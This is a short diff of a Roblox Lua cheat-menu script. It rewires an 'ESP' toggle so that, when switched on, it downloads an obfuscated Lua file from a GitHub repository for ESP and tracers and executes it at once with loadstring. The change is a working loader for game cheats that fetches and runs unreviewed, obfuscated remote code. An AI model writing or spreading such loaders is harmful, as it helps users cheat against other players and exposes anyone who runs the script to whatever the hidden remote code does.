@@ -96,11 +96,17 @@ local Input = MainTab:CreateInput({
 })
 
 local Toggle = MainTab:CreateToggle({
-   Name = "ESP",
+   Name = "Esp",
    CurrentValue = false,
    Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
-        pcall(function() loadstring(game:HttpGet('https://[Log in to view URL]'))() end)
+ function loadAndRunScript(url)
+    local HttpService = game:GetService("HttpService")
+    local scriptContent = HttpService:HttpGet(url)
+    local func = loadstring(scriptContent)
+    func()
+end
+
+loadAndRunScript("https://raw.githubusercontent.com/User319183/Roblox-ESP-and-Tracers/main/obfuscated.lua")
    end,
 })
-
